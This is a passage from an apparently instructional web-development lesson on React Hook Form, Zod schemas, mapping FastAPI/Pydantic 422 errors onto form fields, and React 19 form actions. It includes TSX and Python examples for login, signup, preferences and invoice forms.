<li><code>useForm&lt;T&gt;(options)</code> creates the form. Important options: <code>defaultValues</code> (always provide them: they define the initial values, what "dirty" means, and what <code>reset()</code> returns to), <code>resolver</code> (plug in a schema library), and <code>mode</code> (<code>"onSubmit"</code> default, <code>"onBlur"</code>, <code>"onTouched"</code>, <code>"onChange"</code>, <code>"all"</code>): when validation first runs. <code>reValidateMode</code> controls when it runs again after a failed submit.</li>
<li><code>register(name, rules?)</code> returns <code>{ name, ref, onChange, onBlur }</code>, which you spread onto a native <code>&lt;input&gt;</code>, <code>&lt;select&gt;</code> or <code>&lt;textarea&gt;</code>. Built-in rules include <code>required</code>, <code>min</code>, <code>max</code>, <code>minLength</code>, <code>pattern</code>, <code>validate</code>; options like <code>valueAsNumber</code> and <code>valueAsDate</code> convert the string the DOM gives you.</li>
<li><code>handleSubmit(onValid, onInvalid?)</code> returns an event handler for <code>onSubmit</code>. It calls <code>preventDefault</code>, validates everything, focuses the first invalid field, and calls <code>onValid(values)</code> only if the form is valid. If <code>onValid</code> returns a promise, <code>formState.isSubmitting</code> is <code>true</code> until it settles.</li>
<li><code>formState</code> holds <code>errors</code>, <code>isSubmitting</code>, <code>isSubmitSuccessful</code>, <code>isDirty</code>, <code>dirtyFields</code>, <code>touchedFields</code>, <code>isValid</code> and more. It is wrapped in a <b>Proxy</b>: RHF records which properties your render <i>read</i> and only re-renders the host component when those change. Read <code>isValid</code> and you subscribe to validity; don't read it and you pay nothing.</li>
<li><code>Controller</code> / <code>useController</code> bridge components that are <b>not</b> native inputs: a date picker, a combobox, a custom switch, a rich-text editor. They expose <code>field</code> (<code>value</code>, <code>onChange</code>, <code>onBlur</code>, <code>name</code>, <code>ref</code>) and <code>fieldState</code> (<code>error</code>, <code>isTouched</code>, <code>isDirty</code>). The field becomes controlled, but only that one field re-renders when it changes.</li>
<li><code>useFieldArray({ control, name })</code> manages arrays of objects: <code>fields</code> (each with a generated <code>id</code> to use as the React key), <code>append</code>, <code>prepend</code>, <code>insert</code>, <code>remove</code>, <code>move</code>, <code>swap</code>, <code>update</code>, <code>replace</code>. Field names become paths like <code>lines.2.quantity</code>.</li>
<li><code>watch</code> / <code>useWatch</code> subscribe to values (to show a running total, or conditional fields). <code>useWatch</code> isolates the re-render to the component that calls it; calling <code>watch()</code> with no arguments at the top of the form re-renders the whole form on every keystroke and quietly undoes RHF's main benefit.</li>
<li><code>setError(name, { type, message }, { shouldFocus })</code>, <code>clearErrors</code>, <code>reset(values?)</code>, <code>setValue</code>, <code>getValues</code>, <code>trigger</code> round out the imperative API. Errors whose name starts with <code>root.</code> (for example <code>root.server</code>) are form-level and are not tied to a field.</li>
</ul>

<h5>Zod and <code>zodResolver</code>: one schema, runtime checks and types</h5>
<p><b>Zod</b> describes data as a schema object that can <i>parse</i> unknown input at runtime (<code>schema.safeParse(x)</code> returns <code>{ success, data | error }</code>) and from which TypeScript infers the static type (<code>z.infer&lt;typeof schema&gt;</code>). That removes the classic drift where the TS type says <code>age: number</code> but the validation code forgot to check it.</p>
<ul class="pts">
<li>Install: <code>npm install react-hook-form zod @hookform/resolvers</code>. Then <code>useForm&lt;Values&gt;({ resolver: zodResolver(schema) })</code>. The resolver runs the schema on validation and translates Zod issues into RHF's <code>errors</code> object, keyed by path.</li>
<li>Cross-field rules (password confirmation, "end date after start date") use <code>.refine(fn, { message, path: ["confirm"] })</code> on the object; <code>path</code> tells RHF which field shows the error.</li>
<li><b>Input vs output types.</b> A schema that transforms (<code>z.coerce.number()</code>, <code>.transform()</code>, defaults) has a different <i>input</i> type (what the form holds) and <i>output</i> type (what <code>onValid</code> receives). Recent <code>@hookform/resolvers</code> versions infer both, and <code>useForm</code> takes them as its first and third type parameters (<code>useForm&lt;z.input&lt;typeof s&gt;, unknown, z.output&lt;typeof s&gt;&gt;</code>). The simplest way to avoid confusion is schemas whose input and output are the same, and conversions done by <code>register</code> options such as <code>valueAsNumber</code>.</li>
<li><b>Version note.</b> Zod 4 changed parts of the API: top-level string formats such as <code>z.email()</code> (Zod 3 used <code>z.string().email()</code>, which still works in 4 but is deprecated), an <code>error</code> parameter alongside the older <code>message</code>, and new error-formatting helpers. Check which major version your project has before copying snippets; the examples below use <code>z.email()</code> and otherwise stick to APIs present in both.</li>
</ul>

<h5>Sharing rules with FastAPI: the server is the authority</h5>
<p>Client validation is a <b>user-experience feature</b>: instant feedback, no round trip. It is not security: anyone can call <code>POST /api/users</code> with <code>curl</code>. FastAPI validates the body with a <b>Pydantic</b> model and returns <code>422 Unprocessable Entity</code> with a list of errors, each with a <code>loc</code> (location path such as <code>["body", "email"]</code> or <code>["body", "lines", 2, "quantity"]</code>), a <code>msg</code> and a <code>type</code>. Some rules can <i>only</i> be checked on the server ("email already registered", "SKU out of stock"), and you'll usually return those with your own status code (409, 400) and a field name.</p>
<ul class="pts">
<li><b>Mapping 422 to fields:</b> drop the first <code>loc</code> element (<code>"body"</code>, <code>"query"</code>, <code>"path"</code>), join the rest with dots. Because RHF also uses dot paths with numeric indexes, <code>["body","lines",2,"quantity"]</code> becomes <code>lines.2.quantity</code>, exactly the name of that input. Unknown paths go to <code>root.server</code> so nothing is silently dropped.</li>
<li><b>Keeping rules in sync:</b> you cannot literally share Python and TypeScript code, so pick one source of truth. Common approaches: generate TypeScript types (and optionally Zod schemas) from FastAPI's OpenAPI document with a code generator (tools such as <code>openapi-typescript</code>, Orval or <code>openapi-zod-client</code>; evaluate the current options yourself), or keep a hand-written Zod schema per form and a contract test that posts invalid data to the real API. Generated schemas capture types and simple constraints (<code>min_length</code> becomes <code>.min()</code>); custom Pydantic validators will not cross over, which is fine because the server still enforces them.</li>
<li>Client and server rules may legitimately differ: the client can be <i>stricter</i> for UX (trim whitespace) but must never accept something the server will reject without showing a clear message when it does.</li>
</ul>

<h5>React 19 form actions</h5>
<p>React 19 made forms a first-class part of React's transition model. These APIs are new; the core ones are stable in React 19, but details (especially reset behaviour and how they interact with libraries) are still evolving, so check the React docs for your exact version.</p>
<ul class="pts">
<li><code>&lt;form action={fn}&gt;</code>: when <code>action</code> is a <i>function</i> (not a URL), React prevents the default navigation, calls <code>fn(formData)</code> inside a transition, and when it finishes, <b>resets the uncontrolled fields</b> of the form. Buttons can override it with <code>formAction={otherFn}</code>. In a framework with Server Functions (Day 13) <code>fn</code> can be a <code>'use server'</code> function and the form even works before JavaScript loads.</li>
<li><code>useActionState(action, initialState, permalink?)</code> from <code>react</code> wraps an action that returns state. It returns <code>[state, formAction, isPending]</code>; your action receives <code>(previousState, formData)</code> and returns the next state (errors, a success message, the submitted values). It replaces the canary-era <code>useFormState</code> from <code>react-dom</code>.</li>
<li><code>useFormStatus()</code> from <code>react-dom</code> returns <code>{ pending, data, method, action }</code> for the <b>nearest parent <code>&lt;form&gt;</code></b>. It must be called in a component rendered <i>inside</i> the form (typically a <code>SubmitButton</code>); called in the component that renders the form, it sees no form and <code>pending</code> stays <code>false</code>.</li>
<li><code>useOptimistic(state, updateFn)</code> returns <code>[optimisticState, addOptimistic]</code>. While an action (or transition) is in flight, <code>addOptimistic(x)</code> shows <code>updateFn(state, x)</code>; when the action finishes, the optimistic value is discarded and the real <code>state</code> shows through. If the request failed and you never updated the real state, the optimistic item simply disappears: automatic rollback.</li>
</ul>

<h5>When to use which</h5>
<table class="tbl"><thead><tr><th>Situation</th><th>Reach for</th></tr></thead><tbody>
<tr><td>Rich client-side form in a Vite SPA: many fields, field arrays, per-field validation on blur, dirty tracking, custom widgets</td><td>React Hook Form + Zod</td></tr>
<tr><td>Simple form (search, newsletter, comment) where you want pending state and a result message with minimal code</td><td><code>useActionState</code> + <code>useFormStatus</code></td></tr>
<tr><td>Next.js / RSC app submitting to Server Functions, progressive enhancement matters</td><td>Form actions (optionally with Zod on the server); RHF only where the UX needs it</td></tr>
<tr><td>The submit is really "mutate server data and refresh cached queries"</td><td>RHF or actions for the form, TanStack Query <code>useMutation</code> (Day 7) for the request and cache invalidation</td></tr>
<tr><td>Route-level form whose result should re-run loaders</td><td>React Router <code>&lt;Form&gt;</code> and route actions (Day 8)</td></tr>
</tbody></table>`,
      why: `<p>Before form libraries, every React team wrote the same code: a <code>useState</code> per field (or a big object), an <code>errors</code> object, a <code>touched</code> object, a <code>handleChange</code> that switched on <code>e.target.name</code>, and a <code>validate()</code> function that duplicated the backend's rules by hand. Formik standardised this but kept everything in React state, so large forms still re-rendered on every keystroke. Types and validation lived in separate places and drifted: the type said a field was required, the validator forgot.</p>
<p>React Hook Form exists to make large forms <b>fast by default</b> (uncontrolled inputs, subscription-based re-renders) and <b>small to write</b> (<code>register</code> instead of five props). Zod exists so one declaration produces both the runtime check and the static type. The 422 mapping exists because the backend is the real authority and its errors must reach the right field, not a generic toast.</p>
<p>React 19 actions exist for a different reason: React wanted forms to participate in <b>transitions</b> and Server Functions, so pending states, optimistic UI and progressive enhancement come from React itself rather than from every app re-implementing <code>isSubmitting</code>. They don't replace RHF's field-level features; they cover the common "submit, show pending, show result" path with less code.</p>`,
      diagram: {
        html: flow([
          ["Inputs", "DOM holds values (uncontrolled)", "g"],
          ["register / Controller", "RHF ref store, proxy formState"],
          ["zodResolver", "schema.safeParse on blur / submit"],
          ["handleSubmit", "valid → onValid(values)"],
          ["POST /api/...", "FastAPI + Pydantic re-validate", "w"],
          ["422 detail[]", "loc → setError(path)", "r"]
        ]) + flow([
          ["&lt;form action={formAction}&gt;", "React 19", "g"],
          ["transition starts", "isPending / useFormStatus"],
          ["action(prev, formData)", "returns next state"],
          ["state → UI", "errors or success; form reset", "w"]
        ]),
        steps: [
          "<b>Typing:</b> the browser updates the input's value. RHF's <code>onChange</code> records it in its store; your component does not re-render unless it subscribed to something that changed (an error for this field, <code>isDirty</code>, a <code>useWatch</code>).",
          "<b>Validation:</b> at the moment chosen by <code>mode</code> (blur, change, submit), RHF calls the resolver, which runs the Zod schema over all values and returns errors keyed by path (<code>email</code>, <code>lines.1.quantity</code>). Only fields whose error state changed cause a render.",
          "<b>Submit:</b> <code>handleSubmit</code> prevents the default submit, validates, focuses the first invalid field or calls your <code>onValid</code> with typed values. <code>isSubmitting</code> is true while your promise is pending.",
          "<b>Server:</b> FastAPI parses the JSON body into a Pydantic model. Invalid data never reaches your handler; FastAPI returns <code>422</code> with <code>detail[]</code>. Business-rule failures (duplicate email) come from your handler as 409/400.",
          "<b>Mapping back:</b> the client converts each <code>loc</code> to a field path and calls <code>setError(path, { type: 'server', message })</code>; unknown ones go to <code>root.server</code>. The user sees the message beside the field, and focus moves there.",
          "<b>Action path (React 19):</b> submitting a form whose <code>action</code> is a function starts a transition; <code>isPending</code> and <code>useFormStatus().pending</code> turn true, the action returns the next state, React renders it and resets the uncontrolled fields."
        ]
      },
      ex: [
        {
          t: "The problem: a controlled-everything form re-renders on every keystroke",
          lang: "tsx",
          code: `import { useState, type ChangeEvent, type FormEvent } from "react";

type Profile = { firstName: string; lastName: string; email: string; bio: string };
type Errors = Partial<Record<keyof Profile, string>>;

export function ProfileFormByHand() {
  const [values, setValues] = useState<Profile>({ firstName: "", lastName: "", email: "", bio: "" });
  const [errors, setErrors] = useState<Errors>({});
  const [touched, setTouched] = useState<Partial<Record<keyof Profile, boolean>>>({});

  console.log("render ProfileFormByHand"); // logs on EVERY keystroke in ANY field

  function onChange(e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) {
    const name = e.target.name as keyof Profile;
    setValues((v) => ({ ...v, [name]: e.target.value }));
  }
  function onBlur(e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) {
    const name = e.target.name as keyof Profile;
    setTouched((t) => ({ ...t, [name]: true }));
    setErrors(validate({ ...values }));
  }
  function validate(v: Profile): Errors {
    const out: Errors = {};
    if (!v.firstName.trim()) out.firstName = "Required";
    if (!/^[^@\\s]+@[^@\\s]+$/.test(v.email)) out.email = "Enter a valid email";
    return out;
  }
  function onSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const errs = validate(values);
    setErrors(errs);
    setTouched({ firstName: true, lastName: true, email: true, bio: true });
    if (Object.keys(errs).length === 0) console.log("submit", values);
  }

  return (
    <form onSubmit={onSubmit} noValidate>
      <label htmlFor="firstName">First name</label>
      <input id="firstName" name="firstName" value={values.firstName} onChange={onChange} onBlur={onBlur} />
      {touched.firstName && errors.firstName && <p>{errors.firstName}</p>}
      {/* ...repeat value/onChange/onBlur/touched/error for every field... */}
      <label htmlFor="email">Email</label>
      <input id="email" name="email" value={values.email} onChange={onChange} onBlur={onBlur} />
      {touched.email && errors.email && <p>{errors.email}</p>}
      <button type="submit">Save</button>
    </form>
  );
}`,
          out: `Typing "Ada" in First name logs:
render ProfileFormByHand
render ProfileFormByHand
render ProfileFormByHand`,
          note: `<p>Nothing here is wrong, and for three fields it is fine. But the pattern scales badly: every field adds five pieces of wiring, the validation function duplicates the backend's rules, and each keystroke re-renders the whole form and every child. Hand-written validation is also where bugs hide (that email regex accepts plenty of invalid addresses). Keep this version in mind as the baseline the rest of the topic improves on.</p>`
        },
        {
          t: "React Hook Form basics: register, handleSubmit, formState.errors",
          lang: "tsx",
          code: `// npm install react-hook-form
import { useForm, type SubmitHandler } from "react-hook-form";

type LoginValues = { email: string; password: string; remember: boolean };

export function LoginForm() {
  const {
    register,
    handleSubmit,
    setError,
    formState: { errors, isSubmitting },
  } = useForm<LoginValues>({
    defaultValues: { email: "", password: "", remember: false },
    mode: "onTouched", // first validation on blur, then on every change
  });

  const onSubmit: SubmitHandler<LoginValues> = async (values) => {
    const res = await fetch("/api/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include",
      body: JSON.stringify(values),
    });
    if (res.status === 401) {
      setError("root.server", { type: "server", message: "Email or password is incorrect." });
      return;
    }
    if (!res.ok) {
      setError("root.server", { type: "server", message: "Something went wrong. Please try again." });
    }
  };

  console.log("render LoginForm"); // only on mount, on error changes and on submit state changes

  return (
    <form onSubmit={handleSubmit(onSubmit)} noValidate>
      {errors.root?.server && <p role="alert">{errors.root.server.message}</p>}

      <label htmlFor="login-email">Email</label>
      <input
        id="login-email"
        type="email"
        autoComplete="email"
        aria-invalid={errors.email ? true : undefined}
        aria-describedby={errors.email ? "login-email-error" : undefined}
        {...register("email", {
          required: "Email is required",
          pattern: { value: /^[^@\\s]+@[^@\\s]+$/, message: "Enter a valid email" },
        })}
      />
      {errors.email && <p id="login-email-error">{errors.email.message}</p>}

      <label htmlFor="login-password">Password</label>
      <input
        id="login-password"
        type="password"
        autoComplete="current-password"
        aria-invalid={errors.password ? true : undefined}
        {...register("password", { required: "Password is required" })}
      />
      {errors.password && <p>{errors.password.message}</p>}

      <label>
        <input type="checkbox" {...register("remember")} /> Remember me
      </label>

      <button type="submit" disabled={isSubmitting}>
        {isSubmitting ? "Signing in…" : "Sign in"}
      </button>
    </form>
  );
}`,
          out: `Typing in Email: no "render LoginForm" logs.
Tab away from an empty Email: one render, "Email is required" appears.
Submit with wrong password: renders for isSubmitting true/false, then the alert shows.`,
          note: `<p><code>register</code> returns <code>name</code>, <code>ref</code>, <code>onChange</code> and <code>onBlur</code>; spreading it makes the input known to RHF while the DOM keeps the value. <code>noValidate</code> turns off the browser's own validation bubbles so you show consistent messages. Errors that don't belong to one field use the <code>root.*</code> namespace. Use <code>type="submit"</code> explicitly; it is the default for buttons in a form, but being explicit stops surprises when a <code>type="button"</code> component wraps it.</p>`
        },
        {
          t: "Zod schema + zodResolver with inferred TypeScript types",
          lang: "tsx",
          code: `// npm install react-hook-form zod @hookform/resolvers
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

// One declaration = runtime validation + the TypeScript type.
export const signupSchema = z
  .object({
    name: z.string().trim().min(2, "At least 2 characters"),
    email: z.email("Enter a valid email"), // Zod 3: z.string().email("...")
    age: z.number().int("Whole years only").min(18, "You must be 18 or older"),
    password: z.string().min(12, "Use at least 12 characters"),
    confirm: z.string(),
  })
  .refine((v) => v.password === v.confirm, {
    message: "Passwords do not match",
    path: ["confirm"], // which field shows the error
  });

export type SignupValues = z.infer<typeof signupSchema>;
// { name: string; email: string; age: number; password: string; confirm: string }

export function SignupForm({ onDone }: { onDone: (id: number) => void }) {
  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
  } = useForm<SignupValues>({
    resolver: zodResolver(signupSchema),
    defaultValues: { name: "", email: "", password: "", confirm: "" },
    mode: "onTouched",
  });

  async function onValid(values: SignupValues) {
    // values is fully typed AND already validated by the schema
    const payload = { name: values.name, email: values.email, age: values.age, password: values.password };
    const res = await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (res.ok) {
      const user = (await res.json()) as { id: number };
      onDone(user.id);
    }
    // 409 and 422 handling: see the next-but-two example
  }

  return (
    <form onSubmit={handleSubmit(onValid)} noValidate>
      <label htmlFor="su-name">Name</label>
      <input id="su-name" autoComplete="name" {...register("name")} aria-invalid={!!errors.name} />
      {errors.name && <p>{errors.name.message}</p>}

      <label htmlFor="su-email">Email</label>
      <input id="su-email" type="email" autoComplete="email" {...register("email")} aria-invalid={!!errors.email} />
      {errors.email && <p>{errors.email.message}</p>}

      <label htmlFor="su-age">Age</label>
      {/* valueAsNumber: the DOM gives a string; RHF converts it (empty → NaN) */}
      <input id="su-age" type="number" inputMode="numeric" {...register("age", { valueAsNumber: true })} aria-invalid={!!errors.age} />
      {errors.age && <p>{errors.age.message}</p>}

      <label htmlFor="su-password">Password</label>
      <input id="su-password" type="password" autoComplete="new-password" {...register("password")} />
      {errors.password && <p>{errors.password.message}</p>}

      <label htmlFor="su-confirm">Confirm password</label>
      <input id="su-confirm" type="password" autoComplete="new-password" {...register("confirm")} />
      {errors.confirm && <p>{errors.confirm.message}</p>}

      <button type="submit" disabled={isSubmitting}>Create account</button>
    </form>
  );
}`,
          out: `Submitting with age empty: "Invalid input: expected number, received NaN" (Zod 4 default wording; Zod 3 differs)
Submitting with password "abc" and confirm "abd": two messages, under Password and under Confirm password.`,
          note: `<p>The rules moved out of JSX into the schema, so the component only wires fields. <code>z.infer</code> keeps the form type and the validation in lock-step: rename a field in the schema and every <code>register("…")</code> with the old name becomes a type error, because <code>register</code> only accepts valid paths of <code>SignupValues</code>. The default NaN message is unfriendly; for a custom one either pass an error option to <code>z.number()</code> (syntax differs between Zod 3 and 4) or validate the raw string instead. Export the schema: you will reuse it in tests and maybe in the API client.</p>`
        },
        {
          t: "Controller: wiring a custom input that has no native element",
          lang: "tsx",
          code: `import type { Ref } from "react";
import { Controller, useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

// A custom component: a <button role="switch">, not an <input>. You can't spread register() on it.
type SwitchProps = {
  checked: boolean;
  onCheckedChange: (next: boolean) => void;
  onBlur?: () => void;
  label: string;
  ref?: Ref<HTMLButtonElement>; // React 19: ref is a normal prop on function components
};
function Switch({ checked, onCheckedChange, onBlur, label, ref }: SwitchProps) {
  return (
    <button
      ref={ref}
      type="button"
      role="switch"
      aria-checked={checked}
      onClick={() => onCheckedChange(!checked)}
      onBlur={onBlur}
    >
      <span aria-hidden="true">{checked ? "●" : "○"}</span> {label}
    </button>
  );
}

const prefsSchema = z.object({
  displayName: z.string().min(1, "Required"),
  emailAlerts: z.boolean(),
  digestHour: z.number().int().min(0).max(23),
});
type Prefs = z.infer<typeof prefsSchema>;

export function PreferencesForm({ initial, onSave }: { initial: Prefs; onSave: (p: Prefs) => Promise<void> }) {
  const { register, control, handleSubmit, formState: { isDirty, isSubmitting } } = useForm<Prefs>({
    resolver: zodResolver(prefsSchema),
    defaultValues: initial,
  });

  return (
    <form onSubmit={handleSubmit(onSave)} noValidate>
      <label htmlFor="pref-name">Display name</label>
      <input id="pref-name" {...register("displayName")} />

      <Controller
        control={control}
        name="emailAlerts"
        render={({ field, fieldState }) => (
          <>
            <Switch
              ref={field.ref}            // lets RHF focus it on error
              checked={field.value}
              onCheckedChange={field.onChange}
              onBlur={field.onBlur}      // marks the field as touched
              label="Email alerts"
            />
            {fieldState.error && <p>{fieldState.error.message}</p>}
          </>
        )}
      />

      <label htmlFor="pref-hour">Daily digest hour</label>
      <select id="pref-hour" {...register("digestHour", { valueAsNumber: true })}>
        {Array.from({ length: 24 }, (_, h) => (
          <option key={h} value={h}>{String(h).padStart(2, "0")}:00</option>
        ))}
      </select>

      <button type="submit" disabled={!isDirty || isSubmitting}>Save preferences</button>
    </form>
  );
}`,
          note: `<p>Rule of thumb: if the component renders a real <code>&lt;input&gt;</code>/<code>&lt;select&gt;</code>/<code>&lt;textarea&gt;</code> and forwards <code>ref</code>, <code>name</code>, <code>onChange</code> and <code>onBlur</code> to it, <code>register</code> works. If it only exposes <code>value</code>/<code>onChange</code> (most UI-kit date pickers, comboboxes, sliders, switches, rich-text editors), use <code>Controller</code> or the <code>useController</code> hook inside your own wrapper. Pass <code>field.ref</code> so RHF can focus the component when its validation fails, and <code>field.onBlur</code> so "touched" works. <code>isDirty</code> compares against <code>defaultValues</code>, which is why providing them matters.</p>`
        },
        {
          t: "useFieldArray: invoice line items with per-row errors and a live total",
          lang: "tsx",
          code: `import { useFieldArray, useForm, useWatch, type Control } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

const lineSchema = z.object({
  description: z.string().min(1, "Required"),
  quantity: z.number().int("Whole numbers").positive("Must be at least 1"),
  unitPrice: z.number().nonnegative("Cannot be negative"),
});
const invoiceSchema = z.object({
  customer: z.string().min(1, "Required"),
  lines: z.array(lineSchema).min(1, "Add at least one line"),
});
type Invoice = z.infer<typeof invoiceSchema>;

const emptyLine = { description: "", quantity: 1, unitPrice: 0 };

// Isolated subscriber: only THIS component re-renders as quantities/prices change.
function InvoiceTotal({ control }: { control: Control<Invoice> }) {
  const lines = useWatch({ control, name: "lines" });
  const total = lines.reduce((sum, l) => sum + (Number(l.quantity) || 0) * (Number(l.unitPrice) || 0), 0);
  return <p aria-live="polite">Total: {total.toFixed(2)}</p>;
}

export function InvoiceForm({ onSave }: { onSave: (inv: Invoice) => Promise<void> }) {
  const { register, control, handleSubmit, formState: { errors } } = useForm<Invoice>({
    resolver: zodResolver(invoiceSchema),
    defaultValues: { customer: "", lines: [emptyLine] },
  });
  const { fields, append, remove } = useFieldArray({ control, name: "lines" });

  // Array-level error ("Add at least one line"): the resolver stores it under lines.root
  const linesError = errors.lines?.root?.message ?? errors.lines?.message;

  return (
    <form onSubmit={handleSubmit(onSave)} noValidate>
      <label htmlFor="inv-customer">Customer</label>
      <input id="inv-customer" {...register("customer")} />
      {errors.customer && <p>{errors.customer.message}</p>}

      {fields.map((field, index) => {
        const rowErr = errors.lines?.[index];
        return (
          // key = field.id (generated by RHF), NEVER the index
          <fieldset key={field.id}>
            <legend>Line {index + 1}</legend>
            <label>
              Description
              <input {...register(\`lines.\${index}.description\`)} />
            </label>
            {rowErr?.description && <p>{rowErr.description.message}</p>}
            <label>
              Qty
              <input type="number" {...register(\`lines.\${index}.quantity\`, { valueAsNumber: true })} />
            </label>
            {rowErr?.quantity && <p>{rowErr.quantity.message}</p>}
            <label>
              Unit price
              <input type="number" step="0.01" {...register(\`lines.\${index}.unitPrice\`, { valueAsNumber: true })} />
            </label>
            {rowErr?.unitPrice && <p>{rowErr.unitPrice.message}</p>}
            <button type="button" onClick={() => remove(index)} aria-label={"Remove line " + (index + 1)}>
              Remove
            </button>
          </fieldset>
        );
      })}

      {linesError && <p role="alert">{linesError}</p>}
      <button type="button" onClick={() => append(emptyLine)}>Add line</button>
      <InvoiceTotal control={control} />
      <button type="submit">Save invoice</button>
    </form>
  );
}`,
          out: `Remove line 1 of 3: lines 2 and 3 move up and keep their own values and errors.
Remove every line and submit: "Add at least one line".`,
          note: `<p>The template-literal paths (<code>lines.\${index}.quantity</code>) are fully typed: RHF's <code>Path&lt;Invoice&gt;</code> accepts <code>lines.\${number}.quantity</code>, so a typo is a compile error. <code>fields</code> is for rendering keys only; read current values with <code>useWatch</code>/<code>getValues</code>, because <code>fields</code> does not update while the user types. Where an array-level schema error lands depends on the resolver version (current ones put it under <code>lines.root</code>), so the code checks both.</p>`
        },
        {
          t: "FastAPI side: Pydantic model, 422 shape, and a business-rule 409",
          lang: "py",
          code: `# app/users.py  (pip install fastapi "pydantic[email]")
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, EmailStr, Field

router = APIRouter(prefix="/api")

class SignupIn(BaseModel):
    name: str = Field(min_length=2, max_length=80)
    email: EmailStr
    age: int = Field(ge=18)
    password: str = Field(min_length=12)

class UserOut(BaseModel):
    id: int
    name: str
    email: EmailStr

@router.post("/users", status_code=201, response_model=UserOut)
async def create_user(body: SignupIn) -> UserOut:
    # Pydantic already validated body; invalid JSON never reaches this line (FastAPI returns 422).
    if await users_repo.email_exists(body.email):          # PostgreSQL lookup
        # Business rule only the server can check: return a field-addressable error.
        raise HTTPException(status_code=409, detail={"field": "email", "msg": "Email is already registered"})
    user = await users_repo.create(body)
    return UserOut(id=user.id, name=user.name, email=user.email)`,
          out: `POST /api/users {"name":"A","email":"nope","age":16,"password":"x"}
HTTP/1.1 422 Unprocessable Entity
{"detail":[
  {"type":"string_too_short","loc":["body","name"],"msg":"String should have at least 2 characters","input":"A","ctx":{"min_length":2}},
  {"type":"value_error","loc":["body","email"],"msg":"value is not a valid email address: An email address must have an @-sign.","input":"nope","ctx":{"reason":"..."}},
  {"type":"greater_than_equal","loc":["body","age"],"msg":"Input should be greater than or equal to 18","input":16,"ctx":{"ge":18}},
  {"type":"string_too_short","loc":["body","password"],"msg":"String should have at least 12 characters","input":"x","ctx":{"min_length":12}}
]}`,
          note: `<p>This is Pydantic v2's error format (FastAPI on Pydantic v1 returned <code>loc</code>/<code>msg</code>/<code>type</code> without <code>input</code>/<code>ctx</code>; exact message wording varies by version). The parts you depend on are stable: <code>detail</code> is an array and each item has <code>loc</code> and <code>msg</code>. Notice the rules mirror the Zod schema; the server copy is the one that protects the database. Echoing <code>input</code> back can leak a password into logs or error trackers; many teams install a custom <code>RequestValidationError</code> handler that strips <code>input</code> and returns a leaner shape.</p>`
        },
        {
          t: "Mapping 422 (and 409) responses back onto RHF fields",
          lang: "tsx",
          code: `// src/lib/serverErrors.ts
import type { FieldValues, Path, UseFormSetError } from "react-hook-form";

type PydanticError = { type: string; loc: (string | number)[]; msg: string };
type ValidationBody = { detail: PydanticError[] };

function isValidationBody(x: unknown): x is ValidationBody {
  return typeof x === "object" && x !== null && Array.isArray((x as { detail?: unknown }).detail);
}

/** Puts FastAPI 422 errors on the matching fields; unknown locations go to root.server. */
export function applyServerErrors<T extends FieldValues>(
  body: unknown,
  setError: UseFormSetError<T>,
  fieldNames: readonly string[], // top-level field names this form owns
): boolean {
  if (!isValidationBody(body)) return false;
  let focused = false;
  for (const err of body.detail) {
    const [source, ...rest] = err.loc;           // ["body", "lines", 2, "quantity"]
    const path = rest.join(".");                 // "lines.2.quantity" (RHF uses the same dot paths)
    if (source === "body" && rest.length > 0 && fieldNames.includes(String(rest[0]))) {
      setError(path as Path<T>, { type: "server", message: err.msg }, { shouldFocus: !focused });
      focused = true;
    } else {
      setError("root.server", { type: "server", message: err.msg });
    }
  }
  return true;
}

// src/features/signup/SignupForm.tsx (the onValid from the Zod example, completed)
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { signupSchema, type SignupValues } from "./schema";
import { applyServerErrors } from "../../lib/serverErrors";

const FIELDS = ["name", "email", "age", "password"] as const;

export function useSignupForm(onDone: (id: number) => void) {
  const form = useForm<SignupValues>({
    resolver: zodResolver(signupSchema),
    defaultValues: { name: "", email: "", password: "", confirm: "" },
  });
  const { setError } = form;

  const onValid = async (v: SignupValues) => {
    let res: Response;
    try {
      res = await fetch("/api/users", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: v.name, email: v.email, age: v.age, password: v.password }),
      });
    } catch {
      setError("root.server", { type: "network", message: "You appear to be offline. Try again." });
      return;
    }
    if (res.status === 422) {
      const handled = applyServerErrors(await res.json(), setError, FIELDS);
      if (!handled) setError("root.server", { type: "server", message: "Please check the form." });
      return;
    }
    if (res.status === 409) {
      const body = (await res.json()) as { detail: { field: string; msg: string } };
      if (body.detail.field === "email") {
        setError("email", { type: "server", message: body.detail.msg }, { shouldFocus: true });
      } else {
        setError("root.server", { type: "server", message: body.detail.msg });
      }
      return;
    }
    if (!res.ok) {
      setError("root.server", { type: "server", message: "Something went wrong (" + res.status + ")." });
      return;
    }
    const user = (await res.json()) as { id: number };
    onDone(user.id);
  };

  return { form, onSubmit: form.handleSubmit(onValid) };
}`,
          out: `Server says email is taken → the message appears under Email and focus moves there.
Server returns loc ["body","lines",2,"quantity"] → error under line 3's Qty field.
Server returns loc ["query","tenant"] → message in the form-level alert (root.server).`,
          note: `<p>The two classic bugs this avoids: <b>joining the whole <code>loc</code></b> (<code>body.email</code> is not a field, so <code>setError</code> stores an error nobody renders) and <b>throwing on <code>!res.ok</code></b> without catching (RHF re-throws, the button re-enables, and the user sees nothing). Server errors stay until the field is validated again or you call <code>clearErrors</code>; with <code>mode: "onTouched"</code> editing the field re-runs the resolver, which replaces the server error. If you use TanStack Query, put the same mapping in the mutation's <code>onError</code>.</p>`
        },
        {
          t: "React 19: &lt;form action&gt;, useActionState and useFormStatus",
          lang: "tsx",
          code: `import { useActionState } from "react";
import { useFormStatus } from "react-dom";
import { z } from "zod";

const feedbackSchema = z.object({
  email: z.email("Enter a valid email"),
  message: z.string().trim().min(10, "Tell us a bit more (10+ characters)"),
});
type FieldName = "email" | "message";

type FeedbackState = {
  status: "idle" | "error" | "success";
  message: string;
